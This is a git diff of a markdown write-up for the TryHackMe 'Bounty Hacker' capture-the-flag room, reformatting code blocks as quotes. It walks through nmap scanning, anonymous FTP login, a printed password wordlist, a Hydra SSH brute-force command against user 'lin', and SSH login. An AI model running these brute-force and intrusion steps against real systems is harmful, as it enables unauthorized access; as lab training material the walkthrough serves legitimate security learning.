@@ -15,15 +15,11 @@ Start the attack box or connect to TryHackMe via VPN. If you don't know how to c
 
 Start by navigating to the website to check for connectivity or alternatively [ping](https://www.geeksforgeeks.org/ping-command-in-linux-with-examples/ "Ping Information") the IP.
 
-```bash
-ping <IP Address>
-```
+> ping [IP Address]
 
 Once we confirm the machine is up we can start a port scan using [nmap](https://www.freecodecamp.org/news/what-is-nmap-and-how-to-use-it-a-tutorial-for-the-greatest-scanning-tool-of-all-time/ "FreeCodeCamp Tutorial For NMAP") to see what services are running on the machine.
 
-```bash
-nmap -A <IP Address>
-```
+> nmap -A [IP Address]
 
 The results of this nmap scan return three open ports (21, 22, 80) and the services they're currently running (ftp, ssh, http).
 
@@ -36,9 +32,7 @@ The results of this nmap scan return three open ports (21, 22, 80) and the servi
 
 Type the following command in your terminal and when it asks for your name use the word "**anonymous**"
 
-```bash
-ftp <IP Address>
-```
+> ftp [IP Address]
 
 After logging in execute the following command to list all files in the directory:
 
@@ -53,10 +47,9 @@ You should see the following output:
 
 To download these to your current directory type:
 
-```bash
-get locks.txt
-get task.txt
-```
+> get locks.txt
+>
+> get task.txt
 
 ### [BACK TO TOP](#bounty-hacker "Top Of Page")
 
@@ -64,14 +57,13 @@ get task.txt
 
 ## Who wrote the task list?
 
-Reading the [task.txt](./Assets/task.txt "task.txt file") gives us the answer to this step.
+Reading the [task.txt](./Assets/task.txt "task.txt file") file gives us the answer to this step.
 
-```text
-1.) Protect Vicious.
-2.) Plan for Red Eye pickup on the moon.
-
--lin
-```
+> 1.) Protect Vicious.
+>
+> 2.) Plan for Red Eye pickup on the moon.
+>
+>-lin
 
 ### [BACK TO TOP](#bounty-hacker "Top Of Page")
 
@@ -79,42 +71,64 @@ Reading the [task.txt](./Assets/task.txt "task.txt file") gives us the answer to
 
 ## What service can you bruteforce with the text file found?
 
-The other file we found [(locks.txt)](./Assets/locks.txt "locks.txt") was what looked like a password dictionary we could use for Lins SSH login.
+The other file we found ([locks.txt](./Assets/locks.txt "locks.txt")) looked like a password dictionary we could use for Lins SSH login.
 
-```txt
-rEddrAGON
-ReDdr4g0nSynd!cat3
-Dr@gOn$yn9icat3
-R3DDr46ONSYndIC@Te
-ReddRA60N
-R3dDrag0nSynd1c4te
-dRa6oN5YNDiCATE
-ReDDR4g0n5ynDIc4te
-R3Dr4gOn2044
-RedDr4gonSynd1cat3
-R3dDRaG0Nsynd1c@T3
-Synd1c4teDr@g0n
-reddRAg0N
-REddRaG0N5yNdIc47e
-Dra6oN$yndIC@t3
-4L1mi6H71StHeB357
-rEDdragOn$ynd1c473
-DrAgoN5ynD1cATE
-ReDdrag0n$ynd1cate
-Dr@gOn$yND1C4Te
-RedDr@gonSyn9ic47e
-REd$yNdIc47e
-dr@goN5YNd1c@73
-rEDdrAGOnSyNDiCat3
-r3ddr@g0N
-ReDSynd1ca7e
-```
+> rEddrAGON
+>
+> ReDdr4g0nSynd!cat3
+>
+> Dr@gOn$yn9icat3
+>
+> R3DDr46ONSYndIC@Te
+>
+> ReddRA60N
+>
+> R3dDrag0nSynd1c4te
+>
+> dRa6oN5YNDiCATE
+>
+> ReDDR4g0n5ynDIc4te
+>
+> R3Dr4gOn2044
+>
+> RedDr4gonSynd1cat3
+>
+> R3dDRaG0Nsynd1c@T3
+>
+> Synd1c4teDr@g0n
+>
+> reddRAg0N
+>
+> REddRaG0N5yNdIc47e
+>
+> Dra6oN$yndIC@t3
+>
+> 4L1mi6H71StHeB357
+>
+> rEDdragOn$ynd1c473
+>
+> DrAgoN5ynD1cATE
+>
+> ReDdrag0n$ynd1cate
+>
+> Dr@gOn$yND1C4Te
+>
+> RedDr@gonSyn9ic47e
+>
+> REd$yNdIc47e
+>
+> dr@goN5YNd1c@73
+>
+> rEDdrAGOnSyNDiCat3
+>
+> r3ddr@g0N
+>
+> ReDSynd1ca7e
+
 
 Executing the following command in your terminal will [bruteforce the SSH](https://www.linuxfordevices.com/tutorials/linux/hydra-brute-force-ssh "Article On SSH Brute Force") password for Lin using [Hydra](https://en.wikipedia.org/wiki/Hydra_(software) "Hydra Wikipedia").
 
-```bash
-hydra -l lin -P </path/to/wordlist> <IP ADDRESS> ssh
-```
+> hydra -l lin -P [path/to/wordlist] [IP ADDRESS] ssh
 
 
 ## What is the users password?
@@ -129,9 +143,7 @@ Use the [locks.txt](./Assets/locks.txt "Password Dictionary") file as the wordli
 
 Once you have the password SSH into lins account.
 
-```bash
-ssh lin@<IP Address>
-```
+> ssh lin@[IP Address]
 
 Execute the following commands to list all files within the current directory.
 
